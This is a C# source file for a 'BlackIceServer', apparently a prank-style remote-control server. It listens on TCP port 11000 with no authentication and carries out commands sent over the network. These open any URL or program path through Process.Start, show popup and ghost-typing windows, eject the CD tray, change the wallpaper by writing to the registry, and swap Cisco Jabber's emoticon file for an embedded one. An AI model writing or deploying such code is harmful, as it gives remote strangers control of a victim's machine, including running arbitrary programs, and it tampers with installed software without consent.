using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BlackIceServer
{
    class Server
    {
        [STAThread]
        public static void Main(String[] args)
        {
            Application.EnableVisualStyles();
            StartListening();
        }

        [DllImport("winmm.dll")]
        static extern Int32 mciSendString(String command, StringBuilder buffer, Int32 bufferSize, IntPtr hwndCallback);

        // Incoming data from the client.
        public static string data = null;

        public static void StartListening()
        {
            // Data buffer for incoming data.
            byte[] bytes = new Byte[8192];

            // Establish the local endpoint for the socket.
            // Dns.GetHostName returns the name of the host running the application.
            IPHostEntry ipHostInfo = Dns.Resolve(Dns.GetHostName());
            IPAddress ipAddress = ipHostInfo.AddressList[0];
            IPEndPoint localEndPoint = new IPEndPoint(ipAddress, 11000);

            // Create a TCP/IP socket.
            Socket listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            // Bind the socket to the local endpoint and listen for incoming connections.
            listener.Bind(localEndPoint);
            listener.Listen(10);

            // Start listening for connections.
            while (true)
            {
                // Program is suspended while waiting for an incoming connection.
                Socket handler = listener.Accept();

                // An incoming connection needs to be processed.
                while (true)
                {
                    bytes = new byte[8192];
                    try
                    {
                        int bytesRec = handler.Receive(bytes);
                        data = Encoding.ASCII.GetString(bytes, 0, bytesRec);

                        Regex regex = new Regex("<@>");
                        string[] substrings = regex.Split(data);
                        ExecuteTask(substrings[0], substrings[1]);
                    }
                    catch (Exception e)
                    {
                        //handler.Shutdown(SocketShutdown.Both);
                        //handler.Close();
                    }
                }
            }

        }

        private static void CopyToTemp(string directoryPath, string filePath)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            // Read category
            using (Stream stream = assembly.GetManifestResourceStream(filePath))
            using (BinaryReader reader = new BinaryReader(stream))
            {
                if (!Directory.Exists(@"C:\Temp"))
                    Directory.CreateDirectory(@"C:\Temp");

                if (File.Exists(directoryPath))
                    File.Delete(directoryPath);

                using (BinaryWriter writer = new BinaryWriter(File.Open(directoryPath, FileMode.CreateNew)))
                {
                    byte[] buffer = new byte[32768];
                    int read;

                    while ((read = reader.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        writer.Write(buffer, 0, read);
                    }
                }
            }
        }

        private static void Jabber()
        {
            string fileName = "emoticonDefs.xml";
            string sourcePath = @"C:\Program Files (x86)\Cisco Systems\Cisco Jabber\Emoticons";
            string targetPath = @"C:\Temp";

            // Use Path class to manipulate file and directory paths.
            string sourceFile = Path.Combine(sourcePath, fileName);
            string destFile = Path.Combine(targetPath, fileName);

            // To copy a folder's contents to a new location:
            // Create a new target folder, if necessary.
            if (!Directory.Exists(targetPath))
                Directory.CreateDirectory(targetPath);

            // To copy a file to another location and overwrite the destination file if it already exists.
            System.IO.File.Move(sourceFile, destFile);

            CopyToTemp(@"Desktop\emoticonDefs.xml", "BlackIceServer.Resources.emoticonDefs.xml");
        }

        private static void ExecuteTask(string Command, string Message)
        {
            switch (Command)
            {
                case "URL":
                    Task.Run(() => System.Diagnostics.Process.Start(Message));
                    break;
                case "Ghost":
                    Application.EnableVisualStyles();
                    Task.Run(() => Application.Run(new GhostType(Message)));
                    break;
                case "Pop":
                    Application.EnableVisualStyles();
                    Task.Run(() => Application.Run(new PopMessage(Message)));
                    break;
                case "ROM":
                    // To open the door
                    if (Message == "Eject")
                        Task.Run(() => mciSendString("set CDAudio door open", null, 0, IntPtr.Zero));
                    // To close the door
                    if (Message == "Close")
                        Task.Run(() => mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero));
                    break;
                case "Sketch":
                    Task.Run(() => Application.Run(new GhostType(Message)));
                    break;
                case "Matrix":
                    Task.Run(() => Application.Run(new Matrix()));
                    break;
                case "Change":
                    CopyToTemp(@"C:\Temp\BakerPic.JPG", "BlackIceServer.Resources.BakerPic.JPG");
                    Uri WallPaperUri = new Uri(@"C:\Temp\BakerPic.JPG");
                    Wallpaper.Set(WallPaperUri, Wallpaper.Style.Centered);
                    break;
                case "Jab":
                    //Task.Run(() => Jabber());
                    Task.Run(() => CopyToTemp(@"C:\Temp\emoticonDefs.xml", "BlackIceServer.Resources.emoticonDefs.xml"));
                    break;
                default:
                    break;

            }
        }
    }

    public sealed class Wallpaper
    {
        Wallpaper() { }

        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public enum Style : int
        {
            Tiled,
            Centered,
            Stretched
        }

        public static void Set(Uri uri, Style style)
        {
            Stream s = new WebClient().OpenRead(uri.ToString());

            System.Drawing.Image img = System.Drawing.Image.FromStream(s);
            string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
            img.Save(tempPath, System.Drawing.Imaging.ImageFormat.Bmp);

            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            if (style == Style.Stretched)
            {
                key.SetValue(@"WallpaperStyle", 2.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            if (style == Style.Centered)
            {
                key.SetValue(@"WallpaperStyle", 1.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            if (style == Style.Tiled)
            {
                key.SetValue(@"WallpaperStyle", 1.ToString());
                key.SetValue(@"TileWallpaper", 1.ToString());
            }

            SystemParametersInfo(SPI_SETDESKWALLPAPER,
                0,
                tempPath,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
    }
}
